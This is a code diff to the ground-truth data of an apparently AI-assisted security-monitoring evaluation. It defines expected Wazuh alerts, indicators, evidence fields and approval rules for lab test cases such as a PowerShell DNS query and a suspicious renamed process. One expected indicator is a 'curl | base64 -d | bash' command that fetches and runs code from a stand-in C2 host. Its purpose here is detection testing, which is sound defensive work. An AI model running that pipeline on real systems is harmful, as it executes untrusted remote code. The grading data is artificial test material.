@@ -37,6 +37,10 @@ export interface RealTcGroundTruth extends TcGroundTruth {
   expectedApproval: string;
   expectedVerification: string;
   environmentNote?: string;
+  /** Machine-checkable evidence the simulation emits (values or @placeholders resolved from pre-attack facts). A field is
+   *  null when the telemetry cannot honestly provide it; the reason is in evidenceLimits. Not derived from any AI output. */
+  expectedEvidence?: { host: string; processName: string; processPath: string; commandLine: string; parentProcess: string | null; user: string; fileSha256: string | null; timestamp: string };
+  evidenceLimits?: string[];
 }
 
 const APPROVAL = "IR_TEAM approval required (Policy POL-A01) before any containment; AI never approves";
@@ -88,14 +92,23 @@ export const REAL_GROUND_TRUTH: RealTcGroundTruth[] = [
     knownFindings: ["Stock rule 40112 asserts BOTH T1078 and T1110. PlaybookSelector ties (one technique each) and breaks the tie on fewest-listed-techniques, then code order; ground truth expects PB-ACCOUNT-COMPROMISE (attack intent = compromised account)."],
   },
   {
-    caseId: "TC-05", ruleId: "n/a", attackName: "PowerShell", attackType: "POWERSHELL",
-    mode: "ENVIRONMENT_UNAVAILABLE", simulation: "Requires a Windows endpoint with a Wazuh agent (Sysmon/PowerShell logging). None exists in this environment.",
-    expectedWazuh: { ruleId: "n/a", level: 0, stockRule: false },
-    expectedSeverity: "high", expectedMitre: ["T1059.001"], expectedIocs: [],
+    caseId: "TC-05", ruleId: "100300", attackName: "PowerShell", attackType: "POWERSHELL",
+    mode: "CUSTOM_RULE_REAL_ACTION",
+    simulation: "REAL Windows 10 endpoint (Wazuh agent 4.9.2 + Sysmon): powershell.exe resolves the reserved-TLD lab name vigix-eval-ps-stager.test (DNS query only: nothing is downloaded or changed) -> Sysmon event 22 -> custom rule 100300",
+    expectedWazuh: { ruleId: "100300", level: 12, stockRule: false },
+    expectedSeverity: "high", expectedMitre: ["T1059.001"],
+    expectedIocs: [{ type: "domain", value: "vigix-eval-ps-stager.test" }],
     allowedActions: ["ACT-ISOLATE-ENDPOINT", "ACT-BLOCK-DOMAIN", "ACT-BLOCK-URL", "ACT-BLOCK-SOURCE-IP", "ACT-DISABLE-ACCOUNT", "ACT-KILL-PROCESS", "ACT-QUARANTINE-FILE", "ACT-BLOCK-HASH"],
-    expectedActions: [], expectedTargets: [],
-    expectedPlaybook: "PB-POWERSHELL", approvalExpected: true, expectedPolicy: "POL-A01 approval", expectedApproval: APPROVAL, expectedVerification: VERIFY,
-    knownFindings: [], environmentNote: "ENVIRONMENT_UNAVAILABLE — not simulated and NOT reported as Real Wazuh. The mock TC-05 result (MOCK ground truth) remains the only evidence for this case.",
+    expectedActions: ["ACT-BLOCK-DOMAIN"], expectedTargets: ["vigix-eval-ps-stager.test"],
+    expectedPlaybook: "PB-POWERSHELL", approvalExpected: true,
+    expectedPolicy: "RULE-P07 (severity HIGH) IR_TEAM approval; POL-A02 action compliance (BLOCK-DOMAIN)",
+    expectedApproval: "IR_TEAM approval required (Policy RULE-P07, severity HIGH) before any containment; AI never approves",
+    expectedVerification: VERIFY,
+    knownFindings: [
+      "REAL_WAZUH controlled scenario: the endpoint activity is real (Sysmon event 22 raised by powershell.exe) but the rule is a custom rule (100300) that matches this exact lab name; the stock ruleset has no rule for a PowerShell DNS query. Reported as CUSTOM_RULE_REAL_ACTION, never as a stock detection.",
+      "The scenario proves PowerShell/DNS activity only. It does not prove that the endpoint was compromised, so ACT-ISOLATE-ENDPOINT is not an expected action (Correct Recommendation GT v3.3).",
+      "Wazuh's eventchannel decoder doubles the backslashes inside data.win.eventdata.image and .user; the extractor reports them as stated.",
+    ],
   },
   {
     caseId: "TC-06", ruleId: "31103", attackName: "SQL Injection", attackType: "SQL_INJECTION",
@@ -124,9 +137,15 @@ export const REAL_GROUND_TRUTH: RealTcGroundTruth[] = [
     mode: "CUSTOM_RULE_CONTROLLED_TELEMETRY", simulation: "Real process /tmp/.cache/kworkerd (renamed sleep) as www-data plus a harmless 'curl | base64 -d | bash' pipeline against the test server; process telemetry read from /proc",
     expectedWazuh: { ruleId: "100330", level: 10, stockRule: false },
     expectedSeverity: "medium", expectedMitre: ["T1059.004"],
-    expectedIocs: [{ type: "process", value: "/tmp/.cache/kworkerd" }, { type: "command", value: "curl -s http://vigix-eval-c2.net:8080/x | base64 -d | bash" }],
+    expectedIocs: [{ type: "process", value: "/tmp/.cache/kworkerd" }, { type: "command", value: "curl -s http://vigix-eval-c2.net:8080/x | base64 -d | bash" }, { type: "file", value: "/tmp/.cache/kworkerd" }, { type: "hash", value: "@KWORKERD_SHA256" }],
     allowedActions: ["ACT-KILL-PROCESS", "ACT-QUARANTINE-FILE", "ACT-BLOCK-HASH", "ACT-ISOLATE-ENDPOINT"],
-    expectedActions: ["ACT-KILL-PROCESS", "ACT-QUARANTINE-FILE"], expectedTargets: ["/tmp/.cache/kworkerd", "attack-endpoint"],
+    expectedActions: ["ACT-KILL-PROCESS", "ACT-QUARANTINE-FILE"], expectedTargets: ["/tmp/.cache/kworkerd", "@KWORKERD_SHA256", "attack-endpoint"],
+    expectedEvidence: { host: "attack-endpoint", processName: "kworkerd", processPath: "/tmp/.cache/kworkerd", commandLine: "curl -s http://vigix-eval-c2.net:8080/x | base64 -d | bash", parentProcess: null, user: "www-data", fileSha256: "@KWORKERD_SHA256", timestamp: "event timestamp (alert.timestamp)" },
+    evidenceLimits: [
+      "parentProcess is null in the specification: the parent of the detached (setsid) process is read from the endpoint at run time (data.audit.parent) and recorded in the simulation facts, but its value is not fixed in advance.",
+      "commandLine is the parent shell pipeline; the process itself is 'sleep 40' renamed kworkerd (its own argv is not security-relevant).",
+      "Process name / PID are only in data.audit.* (data.process is object-mapped in the Wazuh index, so a scalar data.process cannot be indexed); the IOC extractor does not read data.audit.* (PSI-2), so ACT-KILL-PROCESS has no PROCESS_NAME target unless extraction is extended or an analyst adds it.",
+    ],
     expectedPlaybook: "PB-SUSPICIOUS-PROCESS", approvalExpected: true, expectedPolicy: "POL-A01 approval", expectedApproval: APPROVAL, expectedVerification: VERIFY,
     knownFindings: [],
     environmentNote: "ACT-KILL-PROCESS requires COMMAND_LINE evidence; a kill recommendation without a supported target/evidence must not appear.",
@@ -164,5 +183,5 @@ export const realGroundTruthByCase = (caseId: string): RealTcGroundTruth | undef
 /** Substitute "@NAME" placeholders with environment facts known BEFORE the attack (never AI output). */
 export function resolveGroundTruth(gt: RealTcGroundTruth, ctx: Record<string, string>): RealTcGroundTruth {
   const sub = (v: string) => (v.startsWith("@") ? ctx[v.slice(1)] ?? v : v);
-  return { ...gt, expectedIocs: gt.expectedIocs.map((i) => ({ ...i, value: sub(i.value) })), expectedTargets: gt.expectedTargets.map(sub) };
+  return { ...gt, expectedIocs: gt.expectedIocs.map((i) => ({ ...i, value: sub(i.value) })), expectedTargets: gt.expectedTargets.map(sub), ...(gt.expectedEvidence ? { expectedEvidence: { ...gt.expectedEvidence, fileSha256: gt.expectedEvidence.fileSha256 ? sub(gt.expectedEvidence.fileSha256) : null } } : {}) };
 }
